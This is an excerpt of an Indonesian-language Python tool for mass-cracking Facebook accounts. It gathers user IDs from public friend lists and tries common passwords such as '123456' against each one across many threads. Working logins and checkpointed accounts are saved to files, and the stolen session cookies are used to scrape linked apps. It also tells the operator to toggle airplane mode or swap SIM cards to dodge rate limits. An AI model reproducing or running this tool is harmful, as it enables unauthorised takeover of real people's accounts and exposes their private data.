...
def banner():
	...
	sol().print(wel2)
	au='AUTHOR    :  FUEGO FFH \nGITHUB    :  https://github.com/MAFIA-FUEGO \nWHATSAPP  :  081572025492'
...
def menu(my_name,my_id):
	...
	io = '[01] Crack From Friendlist Public\n[02] Crack Dari Pertemanan Publik (Multi-Crack)\n[03] Check Result Crack\n[04] Check Crack Checkpoint\n[00] Log Out'
...
def result():
	...
	if kz in ['1','01']:
		...
		if len(vin)==0:
			...
			gerr2 = '# PILIH RESULT UNTUK DIShow'
...
def file():
	...
	if len(my_files)==0:
		yy = '# ANDA BELUM MEMILIKI RESULT UNTUK DICheck'
		...
		for isi in my_files:
			...
			if cih<10:
				...
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
		teks2 = '# PILIH FILE YG AKAN DI Check'
...
def dump_massal():
	...
	for userr in uid:
		try:
			...
			sol().print(lo, style='cyan')
			exit()
	tot = '# BERResults MENGUMPULKAN %s ID'%(len(id))
	if len(id)==0:
...
def setting():
	...
	aplik = input(x+'['+p+'f'+x+'] Show Aplikasi Tertaut ? (y/t) : ')
	if aplik in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	osk = input(x+'['+p+'f'+x+'] Show Opsi Checkpoint? [ Not Recommended ] (y/t) : ')
	if osk in ['y','Y']:
		oprek.append('ya')
	else:
		oprek.append('no')
...
def passwrd():
	...
	krek = 'Results IJO  Disimpan Ke : OK/%s\nResults Check Disimpan Ke : CP/%s\nHidupkan/Matikan Mode Pesawat Setiap 5 Menit'%(okc,cpc)
	cetak(nel(krek, title='CRACK'))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['223344','123456','1122334455','123456']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
			...
			if 'mobile' in method:
				...
				pool.submit(crack,idf,pwv)
	print('')
	tanya = '# INGIN MENGECheck OPSI Results CRACK?'
	sol().print(mark(tanya, style='green'))
	woi = input(x+'['+p+'f'+x+'] Ingin Menampilkan Opsi Results Crack? (y/t) : ')
	if woi in ['y','Y']:
		Check_opsi()
	else:
		exit()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					Check =session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					Check2 = session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(Check)):
						infoakun += (f"Aplikasi Yang Terkait*\n")
						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in Check:
							infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")
						else:
							infoakun += (f"	Aplikasi Aktif : \n")
							apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(Check))
							ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(Check))
							for muncul in apkAktif:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
								hit2+=1
						if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in Check2:
							infoakun += (f"\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
						else:
							hit1,hit2=1,1
							infoakun += (f"	Aplikasi Kedaluwarsa :\n")
							apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(Check2))
							kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(Check2))
...
#			tix = time.time()
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					infoakun = ""
					session = requests.Session()
					Check =session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki).text
					Check2 = session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki).text
					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(Check)):
						infoakun += (f"Aplikasi Yang Terkait*\n")
						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in Check:
							infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")
...
def Checker(idf,pw):
	...
	try:
		...
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Tidak Dapat MengeCheck Opsi (Check Login Di Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
...
def Check_opsi():
	c = len(akun)
	hu = 'Terdapat %s Akun Untuk DiCheck\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
	cetak(nel(hu, title='Check OPSI'))
	input(x+'['+h+'•'+x+'] Mulai')
	Check = '# PROSES Check OPSI DIMULAI'
	sol().print(mark(Check, style='green'))
	love = 0
	for kes in akun:
		try:
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					...
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Tidak Dapat MengeCheck Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
